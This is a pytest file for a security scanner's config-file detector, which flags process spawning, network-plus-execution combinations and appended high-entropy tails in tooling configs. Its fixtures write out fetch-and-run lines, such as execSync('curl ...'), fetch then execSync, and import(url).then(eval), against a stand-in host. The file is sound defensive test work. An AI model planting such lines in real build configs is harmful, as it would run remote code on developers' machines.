"""`config_role` detector tests (task 3.1).

Trigger strings here are inert capability verbs, never a payload (AGENTS.md 4). Rules come from
the shipped data files, so a pattern edited in TOML is tested against the text that will actually
run. The caps are small so a long line is long without the fixture being huge.

This covers the code half of the detector only. The `pattern` rules (`cfg-dynamic-code`,
`cfg-network`, `cfg-chain-endpoint`, `cfg-long-line`) are emitted by the engine pass, and a test
here asserts config_role does not report them a second time.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

from airlock import roles
from airlock.detectors import DETECTOR_NAMES, config_role
from airlock.model import FileEntry, Manifest, Policy, ScanContext, Severity
from airlock.rules import load_role_globs, load_rules

REPO_ROOT = Path(__file__).resolve().parents[2]
DOWNLOADER = "http://example.invalid" + "/x"


def make_rules() -> tuple[Any, ...]:
    role_globs = load_role_globs(REPO_ROOT / "rules" / "roles.toml")
    return load_rules(
        REPO_ROOT / "rules" / "builtin",
        known_detectors=DETECTOR_NAMES,
        known_roles=sorted(roles.known_roles(role_globs)),
    )


def make_entry(
    path: str = "postcss.config.js",
    text: str = "",
    *,
    entry_roles: tuple[str, ...] | None = None,
) -> FileEntry:
    roles_ = entry_roles if entry_roles is not None else (roles.TOOLING_CONFIG_ROLE, "source")
    return FileEntry(path=path, sha256="a" * 64, roles=roles_, text=text)


def make_context(entries: list[FileEntry], **policy: Any) -> ScanContext:
    values: dict[str, Any] = {"line_cap": 90, "tail_max_len": 60, "tail_entropy": 4.5}
    values.update(policy)
    return ScanContext(
        entries=tuple(entries),
        policy=Policy(**values),
        manifest=Manifest(),
        rules=make_rules(),
    )


def run_ids(entries: list[FileEntry], **policy: Any) -> list[str]:
    return [finding.rule_id for finding in config_role.run(make_context(entries, **policy))]


def run_for(entry: FileEntry, **policy: Any) -> list[Any]:
    findings = list(config_role.run(make_context([entry], **policy)))
    assert all(finding.path == entry.path for finding in findings)
    return findings


class TestRoleGating:
    def test_a_plain_source_file_gets_no_capability_finding(self) -> None:
        entry = make_entry(
            "src/index.js",
            f"execSync('curl {DOWNLOADER}')\n",
            entry_roles=(roles.SOURCE_ROLE,),
        )
        assert run_ids([entry]) == []

    def test_a_file_the_collector_could_not_read_is_left_to_the_collector(self) -> None:
        unreadable = FileEntry(
            path="next.config.js",
            sha256=None,
            roles=(roles.TOOLING_CONFIG_ROLE,),
            skip_reason="unreadable",
        )
        assert run_ids([unreadable]) == []


class TestSpawnTiers:
    def test_a_build_step_stated_up_front_stays_a_warn(self) -> None:
        findings = run_for(make_entry(text="execSync('npm run build')\n"))
        assert [(f.rule_id, f.severity) for f in findings] == [("cfg-process-spawn", Severity.WARN)]

    def test_a_downloader_in_the_command_escalates_to_high(self) -> None:
        findings = run_for(make_entry(text=f"execSync('curl {DOWNLOADER}')\n"))
        assert [f.severity for f in findings if f.rule_id == "cfg-process-spawn"] == [Severity.HIGH]

    def test_an_inline_script_handed_to_an_interpreter_escalates(self) -> None:
        findings = run_for(make_entry(text="spawnSync('node', ['-c', 'x'])\n"))
        assert [f.severity for f in findings if f.rule_id == "cfg-process-spawn"] == [Severity.HIGH]

    def test_the_engine_does_not_report_the_spawn_line_again(self) -> None:
        findings = run_for(make_entry(text=f"execSync('curl {DOWNLOADER}')\n"))
        assert len([f for f in findings if f.rule_id == "cfg-process-spawn"]) == 1

    def test_a_spawn_hit_past_the_cap_is_left_to_the_cap_rule(self) -> None:
        # A line over `line_cap` reaches no pattern at all; cfg-long-line accounts for it in the
        # engine pass, so the detector stays silent rather than matching an unchecked line.
        line = "execSync('npm run build && curl " + DOWNLOADER + " " + "z" * 120 + "')"
        assert (
            run_ids([make_entry(text=line + "\n")], line_cap=40, tail_max_len=300, tail_entropy=8.0)
            == []
        )


class TestCombination:
    def test_network_plus_execution_is_reported_as_one_high(self) -> None:
        text = f"const src = await fetch('{DOWNLOADER}');\nexecSync(src);\n"
        findings = run_for(make_entry(text=text))
        combination = [f for f in findings if f.rule_id == "cfg-network-exec"]
        assert len(combination) == 1
        assert combination[0].severity is Severity.HIGH
        assert not combination[0].suppressible
        assert combination[0].line == 1

    def test_a_computed_require_counts_as_the_execution_half(self) -> None:
        text = f"const res = await fetch('{DOWNLOADER}');\nconst step = require(payload);\n"
        assert "cfg-network-exec" in [f.rule_id for f in run_for(make_entry(text=text))]

    def test_dynamic_code_alone_with_network_combines(self) -> None:
        text = f"import('{DOWNLOADER}').then(eval);\n"
        assert "cfg-network-exec" in [f.rule_id for f in run_for(make_entry(text=text))]

    def test_execution_without_network_is_not_a_combination(self) -> None:
        assert "cfg-network-exec" not in run_ids([make_entry(text="execSync('npm ci')\n")])

    def test_network_without_execution_is_not_a_combination(self) -> None:
        assert "cfg-network-exec" not in run_ids(
            [make_entry(text=f"const api = '{DOWNLOADER}';\n")]
        )

    def test_a_dynamic_import_of_a_literal_is_not_the_execution_half(self) -> None:
        findings = run_ids([make_entry(text="const mod = await import('node:fs');\n")])
        assert "cfg-network-exec" not in findings


class TestAppendedTail:
    def test_a_long_last_line_is_the_appended_payload_shape(self) -> None:
        text = "export default {\n  plugins: [],\n};\n" + "a" * 40 + "\n"
        tail = [f for f in run_for(make_entry(text=text), tail_max_len=12) if _is_tail(f)]
        assert len(tail) == 1
        assert tail[0].line == 4

    def test_a_high_entropy_last_line_is_flagged_even_when_short(self) -> None:
        text = "module.exports = {};\nK9zQ7xLm2pRt4vWn\n"
        findings = run_for(make_entry(text=text), tail_max_len=20, tail_entropy=3.5)
        assert [f.rule_id for f in findings if _is_tail(f)] == ["cfg-appended-tail"]

    def test_a_repeated_character_tail_is_not_entropy(self) -> None:
        text = "module.exports = {};\n" + "a" * 8 + "\n"
        assert run_ids([make_entry(text=text)], tail_max_len=8, tail_entropy=4.5) == []

    def test_the_last_non_empty_line_is_the_one_measured(self) -> None:
        text = "export default {};\n" + "b" * 40 + "\n\n\n"
        tail = [f for f in run_for(make_entry(text=text), tail_max_len=12) if _is_tail(f)]
        assert [f.line for f in tail] == [2]

    def test_a_short_low_entropy_config_is_clean(self) -> None:
        assert run_ids([make_entry(text="module.exports = { plugins: [] };\n")]) == []


def _is_tail(finding: Any) -> bool:
    return finding.rule_id == "cfg-appended-tail"
